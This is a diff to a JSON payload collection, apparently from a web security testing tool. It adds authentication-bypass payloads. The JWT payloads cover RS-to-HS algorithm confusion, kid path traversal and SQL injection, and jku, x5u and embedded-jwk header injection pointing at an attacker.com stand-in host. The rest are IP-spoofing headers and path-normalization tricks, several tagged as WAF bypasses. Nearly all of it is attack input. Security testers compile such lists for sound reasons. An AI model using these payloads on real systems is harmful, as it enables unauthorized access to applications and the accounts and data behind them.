@@ -27,9 +27,29 @@
     "jwt_confusion": {
       "description": "JWT algorithm confusion attacks (RS256 to HS256)",
       "payloads": [
-        {"payload": "Modify alg from RS256 to HS256, sign with server's RSA public key as HMAC secret", "description": "RS256->HS256 confusion: obtain public key, re-sign with it as HS256 HMAC secret", "waf_bypass": false},
-        {"payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "description": "HS256 header to use in RS256->HS256 attack (base64: {\"alg\":\"HS256\",\"typ\":\"JWT\"})", "waf_bypass": false},
-        {"payload": "Obtain public key from /jwks.json or /.well-known/jwks.json, use as HS256 secret", "description": "Fetch public key from JWKS endpoint and use as HMAC secret in HS256 confusion", "waf_bypass": false}
+        {"payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", "description": "RS256->HS256 confusion header: sign this with the server's RSA public key as HMAC secret", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "description": "Base64-encoded HS256 header for RS256->HS256 confusion attack", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS384\",\"typ\":\"JWT\"}", "description": "RS384->HS384 confusion: sign with RSA public key as HMAC-SHA384 secret", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS512\",\"typ\":\"JWT\"}", "description": "RS512->HS512 confusion: sign with RSA public key as HMAC-SHA512 secret", "waf_bypass": false}
+      ]
+    },
+    "jwt_kid_injection": {
+      "description": "JWT key ID (kid) parameter injection for key confusion and SQLi attacks",
+      "payloads": [
+        {"payload": "{\"kid\":\"../../dev/null\",\"alg\":\"HS256\"}", "description": "kid path traversal to /dev/null — sign with empty string as secret", "waf_bypass": false},
+        {"payload": "{\"kid\":\"../../proc/sys/kernel/hostname\",\"alg\":\"HS256\"}", "description": "kid path traversal to hostname file — sign with hostname as secret", "waf_bypass": false},
+        {"payload": "{\"kid\":\"' UNION SELECT 'known-secret'--\",\"alg\":\"HS256\"}", "description": "SQLi in kid to force known secret — sign with 'known-secret'", "waf_bypass": false},
+        {"payload": "{\"kid\":\"../../../../../../../etc/hostname\",\"alg\":\"HS256\"}", "description": "Deep traversal kid to /etc/hostname — sign with file contents", "waf_bypass": false},
+        {"payload": "{\"kid\":\"key.pem\",\"alg\":\"HS256\"}", "description": "kid pointing to known key file — sign with that file's contents", "waf_bypass": false}
+      ]
+    },
+    "jwt_jku_x5u": {
+      "description": "JWT header injection via jku (JWK Set URL) and x5u (X.509 URL) claims",
+      "payloads": [
+        {"payload": "{\"jku\":\"https://attacker.com/.well-known/jwks.json\",\"alg\":\"RS256\"}", "description": "jku injection: host your own JWKS with matching key pair at attacker URL", "waf_bypass": false},
+        {"payload": "{\"x5u\":\"https://attacker.com/cert.pem\",\"alg\":\"RS256\"}", "description": "x5u injection: host attacker-controlled X.509 certificate chain", "waf_bypass": false},
+        {"payload": "{\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"},\"alg\":\"RS256\"}", "description": "Embedded JWK: inject attacker's public key directly in JWT header", "waf_bypass": false},
+        {"payload": "{\"jku\":\"https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json\",\"alg\":\"RS256\"}", "description": "jku with path traversal to bypass URL allowlist on target domain", "waf_bypass": true}
       ]
     },
     "header_bypass": {
@@ -43,7 +63,11 @@
         {"payload": "X-Custom-IP-Authorization: 127.0.0.1", "description": "Custom IP authorization header seen in some apps", "waf_bypass": false},
         {"payload": "X-Forwarded-Host: localhost", "description": "Host header spoofing via X-Forwarded-Host", "waf_bypass": false},
         {"payload": "X-Host: localhost", "description": "Alternative host override header", "waf_bypass": false},
-        {"payload": "X-ProxyUser-Ip: 127.0.0.1", "description": "Proxy user IP header bypass", "waf_bypass": false}
+        {"payload": "X-ProxyUser-Ip: 127.0.0.1", "description": "Proxy user IP header bypass", "waf_bypass": false},
+        {"payload": "Client-IP: 127.0.0.1", "description": "Client-IP header for IP-based access control bypass", "waf_bypass": false},
+        {"payload": "True-Client-IP: 127.0.0.1", "description": "Akamai/CDN True-Client-IP header bypass", "waf_bypass": false},
+        {"payload": "CF-Connecting-IP: 127.0.0.1", "description": "Cloudflare CF-Connecting-IP header spoofing", "waf_bypass": false},
+        {"payload": "Forwarded: for=127.0.0.1", "description": "RFC 7239 Forwarded header for IP spoofing", "waf_bypass": false}
       ]
     },
     "method_override": {
@@ -70,7 +94,10 @@
         {"payload": "/admin%00", "description": "Null byte path termination", "waf_bypass": true},
         {"payload": "/admin%20", "description": "Trailing space bypass", "waf_bypass": true},
         {"payload": "/.;/admin", "description": "Spring Security dot-semicolon bypass", "waf_bypass": true},
-        {"payload": "/admin/../admin/", "description": "Double traversal normalization", "waf_bypass": true}
+        {"payload": "/admin/../admin/", "description": "Double traversal normalization", "waf_bypass": true},
+        {"payload": "/..;/admin", "description": "Spring Security path traversal via semicolon (CVE-2022-22978)", "waf_bypass": true},
+        {"payload": "/%2e/admin", "description": "URL-encoded dot for path normalization bypass", "waf_bypass": true},
+        {"payload": "/admin%00.json", "description": "Null byte with extension to bypass path-based routing rules", "waf_bypass": true}
       ]
     },
     "oauth_bypass": {
